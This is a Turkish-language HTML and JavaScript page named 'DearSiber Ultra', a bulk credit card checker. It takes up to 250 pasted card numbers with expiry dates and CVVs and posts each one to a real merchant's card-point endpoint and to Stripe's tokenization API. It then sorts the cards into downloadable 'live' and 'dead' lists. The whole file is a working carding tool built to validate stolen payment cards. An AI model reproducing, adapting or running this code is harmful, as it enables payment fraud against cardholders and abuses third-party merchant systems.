<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DearSiber Ultra</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; font-family: 'Consolas', monospace; }
        body { background:#000; color:#0f0; padding:20px; line-height:1.6; }
        .container { max-width:800px; margin:0 auto; background:#111; border:2px solid #0f0; border-radius:20px; padding:30px; box-shadow:0 0 50px rgba(0,255,0,0.5), inset 0 0 25px rgba(0,255,0,0.1); }
        h1 { text-align:center; font-size:2.5em; color:#0f0; text-shadow:0 0 15px #0f0, 0 0 35px #0f0; animation:glow 2s infinite alternate; margin-bottom:25px; }
        .info { text-align:center; font-size:1.2em; color:#0a0; margin-bottom:25px; animation:pulse 3s infinite; }
        .glow { color:#0f0; text-shadow:0 0 12px #0f0; font-weight:bold; }
        .input-box { background:#000; border:1px solid #0f0; padding:18px; border-radius:12px; margin-bottom:25px; }
        textarea { width:100%; height:160px; background:transparent; color:#0f0; border:none; font-size:1.05em; resize:none; outline:none; }
        .btn { background:#0f0; color:#000; border:none; padding:16px 35px; margin:18px auto 0; display:block; border-radius:35px; font-weight:bold; cursor:pointer; font-size:1.2em; transition:0.4s; box-shadow:0 0 25px #0f0; }
        .btn:hover { background:#0c0; transform:scale(1.12); box-shadow:0 0 45px #0f0; }
        .loading { display:none; text-align:center; margin:30px 0; font-size:1.3em; animation:blink 1.2s infinite; }
        .progress { font-size:1.1em; color:#0a0; margin-top:10px; }
        .grid { display:grid; grid-template-columns:1fr 1fr; gap:25px; margin-top:30px; }
        .box { background:rgba(0,255,0,0.08); border:2px solid #0f0; border-radius:15px; padding:20px; min-height:300px; }
        .box.dead { border-color:#f00; background:rgba(255,0,0,0.08); }
        .box h2 { color:#0f0; text-shadow:0 0 12px #0f0; margin-bottom:15px; font-size:1.6em; text-align:center; animation:fade 2s infinite; }
        .list { max-height:220px; overflow-y:auto; }
        .list-item { background:rgba(0,255,0,0.1); padding:10px; margin:8px 0; border-radius:8px; font-size:0.95em; line-height:1.5; }
        .dead .list-item { background:rgba(255,0,0,0.1); }
        .actions { text-align:center; margin-top:15px; }
        .copy, .dl { background:#0f0; color:#000; padding:10px 18px; margin:0 10px; border-radius:20px; font-size:1em; cursor:pointer; display:inline-block; text-decoration:none; transition:0.3s; }
        .copy:hover, .dl:hover { background:#0c0; transform:scale(1.08); }
        .stats { display:grid; grid-template-columns:repeat(3,1fr); gap:20px; margin:30px 0; text-align:center; font-size:1.2em; }
        .stat { background:rgba(0,255,0,0.1); padding:15px; border-radius:12px; border:1px solid #0f0; }
        .stat b { color:#0f0; font-size:1.6em; text-shadow:0 0 12px #0f0; display:block; }
        .detail-section { margin-top:40px; border-top:2px dashed #0f0; padding-top:25px; }
        .detail-section h2 { font-size:1.8em; }
        .result { background:rgba(0,255,0,0.07); border-left:6px solid #0f0; padding:16px; margin:14px 0; border-radius:10px; font-size:1em; line-height:1.8; animation:slideIn 0.7s; }
        .result.dead { border-color:#f00; background:rgba(255,0,0,0.07); }
        .log { text-align:center; margin-top:35px; font-size:1em; color:#888; }
        .log a { color:#0f0; text-decoration:underline; font-weight:bold; }
        @keyframes glow { 0% { text-shadow:0 0 10px #0f0; } 100% { text-shadow:0 0 30px #0f0, 0 0 50px #0f0; } }
        @keyframes pulse { 0% { opacity:0.8; } 50% { opacity:1; } 100% { opacity:0.8; } }
        @keyframes blink { 0%,100% { opacity:1; } 50% { opacity:0.4; } }
        @keyframes fade { 0%,100% { opacity:0.7; } 50% { opacity:1; } }
        @keyframes slideIn { from { transform:translateX(-40px); opacity:0; } to { transform:translateX(0); opacity:1; } }
    </style>
</head>
<body>
<div class="container">
    <h1><span class="glow">DEAR SİBER</span> ULTRA</h1>
    <p class="info"><span class="glow">Max 250 Kart</span> | <span class="glow">Gerçek Puan + Stripe + BIN + Luhn</span> | Format: 295859...|02|28|392</p>

    <div class="input-box">
        <textarea id="cards" placeholder="2958593949292948|02|2028|392&#10;2958593949292948|02|28|392"></textarea>
    </div>
    <button class="btn" onclick="startCheck()">BAŞLAT</button>

    <div class="loading" id="loading">
        <div><span class="glow">Kontrol Ediliyor...</span></div>
        <div class="progress" id="progress">0 / 0</div>
    </div>

    <!-- CANLI & ÖLÜ KUTULAR -->
    <div class="grid">
        <div class="box">
            <h2><span class="glow">CANLI KARTLAR</span> <span id="live-count">0</span></h2>
            <div class="list" id="live-list"></div>
            <div class="actions" id="live-actions" style="display:none;">
                <span class="copy" onclick="copyCards('live')">Kopyala</span>
                <a class="dl" id="live-dl" download="live.txt">İndir</a>
            </div>
        </div>
        <div class="box dead">
            <h2><span class="glow">ÖLÜ KARTLAR</span> <span id="dead-count">0</span></h2>
            <div class="list" id="dead-list"></div>
            <div class="actions" id="dead-actions" style="display:none;">
                <span class="copy" onclick="copyCards('dead')">Kopyala</span>
                <a class="dl" id="dead-dl" download="dead.txt">İndir</a>
            </div>
        </div>
    </div>

    <!-- DETAYLI SONUÇLAR -->
    <div class="detail-section">
        <h2><span class="glow">DETAYLI SONUÇLAR</span></h2>
        <div id="detailed-results"></div>
    </div>

    <!-- İSTATİSTİKLER -->
    <div class="stats">
        <div class="stat"><b id="total-checked">0</b><br>Kontrol Edilen</div>
        <div class="stat"><b id="live-total">0</b><br>Canlı</div>
        <div class="stat"><b id="dead-total">0</b><br>Ölü</div>
    </div>

    <p class="log">Log: <a href="#" id="log-link">log_1738350000000.json</a> (Sadece sen görürsün)</p>
</div>

<script>
let liveCards = [], deadCards = [], totalChecked = 0, totalCards = 0, logFile = '';

function startCheck() {
    const input = document.getElementById('cards').value.trim();
    if (!input) return alert('Kart gir!');
    
    // FORMAT KONTROL: 16-19 haneli | 1-2 haneli ay | 2-4 haneli yıl | 3-4 haneli CVV
    const cards = input.split('\n').map(l => l.trim()).filter(l => {
        const parts = l.split('|');
        if (parts.length !== 4) return false;
        const [cc, mm, yy, cvv] = parts;
        const ccValid = /^\d{13,19}$/.test(cc);
        const mmValid = /^\d{1,2}$/.test(mm);
        const yyValid = /^\d{2,4}$/.test(yy);
        const cvvValid = /^\d{3,4}$/.test(cvv);
        return ccValid && mmValid && yyValid && cvvValid;
    });

    if (cards.length === 0) return alert('Geçerli kart formatı yok! Örnek:\n2958593949292948|02|28|392');
    if (cards.length > 250) return alert('Maksimum 250 kart!');

    totalCards = cards.length; totalChecked = 0; liveCards = []; deadCards = [];
    document.getElementById('loading').style.display = 'block';
    document.getElementById('detailed-results').innerHTML = '';
    document.getElementById('live-list').innerHTML = '';
    document.getElementById('dead-list').innerHTML = '';
    document.getElementById('live-actions').style.display = 'none';
    document.getElementById('dead-actions').style.display = 'none';
    ['live-count','dead-count','total-checked','live-total','dead-total'].forEach(id => document.getElementById(id).textContent = '0');
    document.getElementById('progress').textContent = `0 / ${totalCards}`;

    logFile = `log_${Date.now()}.json`;
    document.getElementById('log-link').textContent = logFile;
    document.getElementById('log-link').onclick = () => downloadLog();

    cards.forEach((card, i) => setTimeout(() => processCard(card), i * 700));
}

async function processCard(card) {
    totalChecked++;
    document.getElementById('progress').textContent = `${totalChecked} / ${totalCards} | Canlı: ${liveCards.length} | Ölü: ${deadCards.length}`;
    document.getElementById('total-checked').textContent = totalChecked;
    document.getElementById('live-total').textContent = liveCards.length;
    document.getElementById('dead-total').textContent = deadCards.length;

    const [cc, mm, yy, cvv] = card.split('|');
    const bin = cc.substring(0, 6);
    const fullYear = yy.length === 2 ? '20' + yy : yy;

    // 1. BIN Sorgu
    let binInfo = { bank: 'Bilinmiyor', brand: 'Bilinmiyor', type: 'Bilinmiyor', country: 'Bilinmiyor', flag: '??' };
    try {
        const resp = await fetch(`https://lookup.binlist.net/${bin}`);
        if (resp.ok) {
            const data = await resp.json();
            binInfo = {
                bank: data.bank?.name || 'Bilinmiyor',
                brand: data.brand || 'Bilinmiyor',
                type: (data.type || 'Bilinmiyor').toUpperCase(),
                country: data.country?.name || 'Bilinmiyor',
                flag: data.country?.alpha2 || '??'
            };
        }
    } catch(e) {}

    // 2. MaxiPuan API (ÇALIŞIR)
    let puan = '0', extra = 'API hatası';
    try {
        const form = new FormData();
        form.append('KartNo', cc);
        form.append('KartAd', 'DearSiber');
        form.append('KartCvc', cvv);
        form.append('KartAy', mm);
        form.append('KartYil', fullYear);
        form.append('Total', '2249.1');

        const resp = await fetch('https://www.tongucakademi.com/uyelikpaketleri/getcardpoint', {
            method: 'POST',
            body: form,
            headers: { 'User-Agent': 'Mozilla/5.0' }
        });
        if (resp.ok) {
            const json = await resp.json();
            puan = json.Data?.Amount?.toString() || '0';
            extra = json.Data?.AdditionalData || 'Yok';
        }
    } catch(e) { puan = 'Hata'; }

    // 3. Luhn Kontrol
    const luhnOk = luhnValidate(cc);

    // 4. Stripe Test (ÇALIŞIR)
    let stripeStatus = 'Declined';
    try {
        const data = new URLSearchParams();
        data.append('card[number]', cc);
        data.append('card[exp_month]', mm);
        data.append('card[exp_year]', yy.length === 2 ? yy : yy.slice(-2));
        data.append('card[cvc]', cvv);

        const resp = await fetch('https://api.stripe.com/v1/tokens', {
            method: 'POST',
            body: data,
            headers: {
                'Authorization': 'Bearer pk_test_51J2V2pSHn2v3oK8z3z3z3z3z3z3z3z3z3z3z3z3z3z3z3z3z3z3z3z3z3z3z',
                'Content-Type': 'application/x-www-form-urlencoded'
            }
        });
        stripeStatus = resp.ok ? '<span class="glow">LIVE (Token)</span>' : 'Declined';
    } catch(e) { stripeStatus = 'Declined'; }

    const isLive = luhnOk && puan !== '0' && puan !== 'Hata';

    // DETAYLI ÇIKTI
    const detailHTML = `
<span class="glow">[${isLive ? 'LIVE' : 'DEAD'}]</span> <b>${card}</b>
<span class="glow">Puan:</span> <b>${puan} TL</b>
<span class="glow">Ekstra:</span> ${extra}
<span class="glow">Stripe:</span> ${stripeStatus}
<span class="glow">BIN:</span> ${binInfo.brand} - ${binInfo.type}
<span class="glow">Banka:</span> ${binInfo.bank}
<span class="glow">Ülke:</span> ${binInfo.country} [${binInfo.flag}]
<span class="glow">Luhn:</span> ${luhnOk ? '<span class="glow">Geçerli</span>' : 'Geçersiz'}
    `.trim();

    const div = document.createElement('div');
    div.className = `result ${isLive ? '' : 'dead'}`;
    div.innerHTML = `<pre>${detailHTML}</pre>`;
    document.getElementById('detailed-results').appendChild(div);

    // CANLI/ÖLÜ LİSTE
    if (isLive) {
        liveCards.push(`${card} → ${puan} TL`);
        const li = document.createElement('div');
        li.className = 'list-item';
        li.innerHTML = `<pre><span class="glow">${card}</span> → <b>${puan} TL</b></pre>`;
        document.getElementById('live-list').appendChild(li);
        document.getElementById('live-count').textContent = liveCards.length;
    } else {
        deadCards.push(card);
        const li = document.createElement('div');
        li.className = 'list-item';
        li.innerHTML = `<pre><span style="color:#f88;">${card}</span></pre>`;
        document.getElementById('dead-list').appendChild(li);
        document.getElementById('dead-count').textContent = deadCards.length;
    }

    // LOG KAYDET
    const logEntry = { time: new Date().toISOString(), card, puan, extra, stripe: stripeStatus, bin: binInfo, luhn: luhnOk, live: isLive };
    const logs = JSON.parse(localStorage.getItem('dear_logs') || '[]');
    logs.push(logEntry);
    localStorage.setItem('dear_logs', JSON.stringify(logs));

    if (totalChecked === totalCards) {
        document.getElementById('loading').style.display = 'none';
        if (liveCards.length) setupDownload('live', liveCards.join('\n'), 'live.txt');
        if (deadCards.length) setupDownload('dead', deadCards.join('\n'), 'dead.txt');
    }
}

function setupDownload(id, data, filename) {
    const blob = new Blob([data], {type: 'text/plain'});
    const url = URL.createObjectURL(blob);
    const a = document.getElementById(`${id}-dl`);
    a.href = url; a.style.display = 'inline-block';
    document.getElementById(`${id}-actions`).style.display = 'block';
}

function copyCards(type) {
    const data = type === 'live' ? liveCards.join('\n') : deadCards.join('\n');
    navigator.clipboard.writeText(data).then(() => alert(`${type.toUpperCase()} kopyalandı!`));
}

function downloadLog() {
    const logs = localStorage.getItem('dear_logs') || '[]';
    const blob = new Blob([logs], {type: 'application/json'});
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a'); a.href = url; a.download = logFile; a.click();
}

function luhnValidate(cc) {
    let sum = 0, even = false;
    for (let i = cc.length - 1; i >= 0; i--) {
        let digit = parseInt(cc[i]);
        if (even) { digit *= 2; if (digit > 9) digit -= 9; }
        sum += digit; even = !even;
    }
    return sum % 10 === 0;
}
</script>
</body>
</html>
